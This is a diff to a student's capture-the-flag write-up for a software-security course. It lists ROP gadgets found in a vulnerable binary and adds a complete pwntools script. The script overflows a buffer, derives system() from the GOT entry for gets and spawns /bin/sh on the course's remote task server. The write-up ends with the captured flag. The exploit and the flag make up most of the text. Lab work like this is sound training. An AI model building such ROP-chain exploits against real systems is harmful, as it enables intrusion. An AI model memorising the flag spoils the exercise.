@@ -72,89 +72,127 @@ ropper --file ./vuln
 ropper --file ./vuln --search syscall
 ropper --file ./vuln --inst-count 2
 ```
-- in total we do the following rop chain
-    - get address of system()
-        - mov rax, [got_gets]
-            g1: 0x0000000000403f62: pop rdx; ret; (set stack to got_gets 0x476040)
-            g2: 0x000000000040a8ee: pop rax; ret; (set stack to 0x0000000000000000)
-            g3: 0x0000000000410c70: mov rax, qword ptr [rdx + rax*8]; ret; 
-        - sub rax, 0x29BB0
-            g4: 0x0000000000403f62: pop rdx; ret; (set stack to 0x29BB0)
-            g5: 0x0000000000411937: sub rax, rdx; ret;
-        - pop rdi (on stack is address of /bin/bash)
-            g6: 0x0000000000401465: pop rdi; ret;
-        - call rax
-            g7: 0x0000000000401010: call rax;
-
-
-
-##### lets fucking go
-- set rcx to value of our choise 
-0x0000000000403f62: pop rdx; ret; 
-0x000000000040d6c7: lea rcx, [rdx + 0x558]; sub rax, rcx; sar rax, 2; ret; 
+- after hours of crying I found the following gadgets and call system('/bin/sh')
+```
+- set rcx to value gadget g09 (0x00000000004129a3)
+g01: 0x0000000000403f62: pop rdx; ret; 
+g02: 0x000000000040d6c7: lea rcx, [rdx + 0x558]; sub rax, rcx; sar rax, 2; ret; 
 - set rax to pointer to /bin/sh
-0x0000000000403f62: pop rdx; ret; (set stack to got_gets 0x476040)
-0x000000000040a8ee: pop rax; ret; (set stack to 0x0000000000000000)
-0x0000000000410c70: mov rax, qword ptr [rdx + rax*8]; ret; 
-0x0000000000403f62: pop rdx; ret; (offset to /bin/sh)
-0x0000000000411937: sub rax, rdx; ret;
+g03: 0x0000000000403f62: pop rdx; ret; 
+g04: 0x000000000040a8ee: pop rax; ret; (set stack to 0x0000000000000000)
+g05: 0x0000000000410c70: mov rax, qword ptr [rdx + rax*8]; ret; 
+g06: 0x0000000000403f62: pop rdx; ret; (offset to /bin/sh)
+g07: 0x0000000000411937: sub rax, rdx; ret;
+g07_new: 0x0000000000404ed1: add rax, rdx; ret;
 - push pointer to /bin/sh to stack and call rcx
-0x000000000040d2ab: push rax; mov edx, 0x1bf8; mov esi, 1; call rcx; 
-- rcx is this instruction
-0x00000000004129a3: mov rdi, qword ptr [rsp + 8]; mov eax, dword ptr [rdi + 0x40]; add rsp, 0x18; ret; 
+g08: 0x000000000040d2ab: push rax; mov edx, 0x1bf8; mov esi, 1; call rcx; 
+- rcx is this g09
+g09: 0x00000000004129a3: mov rdi, qword ptr [rsp + 8]; mov eax, dword ptr [rdi + 0x40]; add rsp, 0x18; ret; 
 - then stack has instruction of next: (! now we may not modify rdi !)
-0x0000000000403f62: pop rdx; ret; (set stack to got_gets 0x476040)
-0x000000000040a8ee: pop rax; ret; (set stack to 0x0000000000000000)
-0x0000000000410c70: mov rax, qword ptr [rdx + rax*8]; ret; 
+g10: 0x0000000000403f62: pop rdx; ret; (set stack to got_gets 0x476040)
+g11: 0x000000000040a8ee: pop rax; ret; (set stack to 0x0000000000000000)
+g12: 0x0000000000410c70: mov rax, qword ptr [rdx + rax*8]; ret; 
 - sub rax, 0x29BB0
-0x0000000000403f62: pop rdx; ret; (set stack to 0x29BB0)
-0x0000000000411937: sub rax, rdx; ret;
+g13: 0x0000000000403f62: pop rdx; ret; (set stack to 0x29BB0)
+g14: 0x0000000000411937: sub rax, rdx; ret;
+
+fil: 0x00000000004011df: nop; ret;
+
 - now in rax is address of system() and in rdi is pointer to /bin/bash
-0x0000000000401010: call rax;
+g15: 0x0000000000401010: call rax;
+```
+- below is the python script that automatically exploits it:
+```
+#!/usr/bin/env python3
 
+import pwn
 
-#####
+pwn.context.arch = 'amd64'
+conn = pwn.remote('tasks.ws24.softsec.rub.de', 33262)
+#conn = pwn.remote('127.0.0.1', 1024)
 
+# use the provided lib c
+#conn = pwn.process('./vuln')
+#pwn.gdb.attach(conn)
 
+# fixed as no ASLR in binray (got offset via IDA)
+adress_got_gets = 0x000000000041BFB8
 
+libz = pwn.ELF('./vuln')
 
+# use my libc for local testing, switch to provided one for server
+#libc = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc = pwn.ELF('./libc.so.6')
 
+offset_gets = libc.symbols['gets']
 
+offset_system = libc.symbols['system']
 
+offset_shell_string = next(libc.search(b'/bin/sh\x00'))
 
+# address_system = address_gets - offset_gets + offset_system
+offset_to_system = offset_gets - offset_system
 
+offset_to_shell_string = offset_shell_string - offset_gets
 
+# address of gedgets
+address_g01 = 0x0000000000403f62 # pop rdx; ret;
+address_g02 = 0x000000000040d6c7 # lea rcx, [rdx + 0x558]; sub rax, rcx; sar rax, 2; ret;
+address_g03 = 0x0000000000403f62 # pop rdx; ret;
+address_g04 = 0x000000000040a8ee # pop rax; ret;
+address_g05 = 0x0000000000410c70 # mov rax, qword ptr [rdx + rax*8]; ret;
+address_g06 = 0x0000000000403f62 # pop rdx; ret;
+address_g07 = 0x0000000000404ed1 # add rax, rdx; ret;
+address_g08 = 0x000000000040d2ab # push rax; mov edx, 0x1bf8; mov esi, 1; call rcx;
+address_g09 = 0x00000000004129a3 # mov rdi, qword ptr [rsp + 8]; mov eax, dword ptr [rdi + 0x40]; add rsp, 0x18; ret; 
+address_g10 = 0x0000000000403f62 # pop rdx; ret;
+address_g11 = 0x000000000040a8ee # pop rax; ret;
+address_g12 = 0x0000000000410c70 # mov rax, qword ptr [rdx + rax*8]; ret;
+address_g13 = 0x0000000000403f62 # pop rdx; ret;
+address_g14 = 0x0000000000411937 # sub rax, rdx; ret;
+address_g15 = 0x0000000000401010 # call rax;
 
+address_fil = 0x00000000004011df # nop; ret;
 
+rop_chain = [
+    b'A'*24,
+    pwn.p64(address_g01),
+    pwn.p64(address_g09 - 0x558),
+    pwn.p64(address_g02),
+    pwn.p64(address_g03),
+    pwn.p64(adress_got_gets),
+    pwn.p64(address_g04),
+    pwn.p64(0x0),
+    pwn.p64(address_g05),
+    pwn.p64(address_g06),
+    pwn.p64(offset_to_shell_string),
+    pwn.p64(address_g07),
+    pwn.p64(address_g08),
+    b'A'*8,
+    pwn.p64(address_g10),
+    pwn.p64(adress_got_gets),
+    pwn.p64(address_g11),
+    pwn.p64(0x0),
+    pwn.p64(address_g12),
+    pwn.p64(address_g13),
+    pwn.p64(offset_to_system),
+    pwn.p64(address_g14),
 
+    pwn.p64(address_fil), # we need to pad sothat call is 16bit alligned
 
+    pwn.p64(address_g15)
+]
 
+rop_chain = b''.join(gadget for gadget in rop_chain)
 
+print(rop_chain.hex())
 
-- we have libz.a in binary without ASLR = known offsets
-    - open('/flag')
-        - first argument (rdi) is pointer to string/filename
-            - 0x0000000000401465: pop rdi; ret; (b'/flag\x00\x00\x00' on stack)
-        - second argument (rsi) are flags (set to 0 = readonly)
-            - 0x0000000000404cc0: pop rsi; ret;  (b'\x00\x00\x00\x00\x00\x00\x00\x00' on stack)
-        - open
-        - now we have fd_flag in rax
-    - write(fd_flag)
-        - first argument (rdi) is output(stdout)
-            - 0x0000000000401465: pop rdi; ret; (1 on stack)
-        - second argument (rsi) is 
+conn.sendline(rop_chain)
+conn.interactive()
+exit()
 
-
-- we write b'/bin/sh\0x00' (8 bytes) to stack
-- we use libz.a do to a ROP chain (rop-syscall-execv), we need the following gadgets:
-    - pop rdi;ret; (and we write b'/bin/sh\0x00' to stack)
-        - 0x0000000000401465: pop rdi; ret; 
-    - mov rax, 59; ret; (write 59 to stack)
-        - 0x000000000040a8ee: pop rax; ret;
-    - mov rsi, 0; ret; (write 0 to stack)
-        - 0x0000000000404cc0: pop rsi; ret; 
-    - mov rdx, 0; ret; (write 0 to stack)
-        - 0x0000000000403f62: pop rdx; ret; 
-    - syscall;
-
-
+```
+- flag
+```
+softsec{s2sKJ-xag9TRXSzvvWbr4MDH7_0ZW4zRkQY3RAFhAXbgay-FKhah4J-mgHAfgdu6}
+```
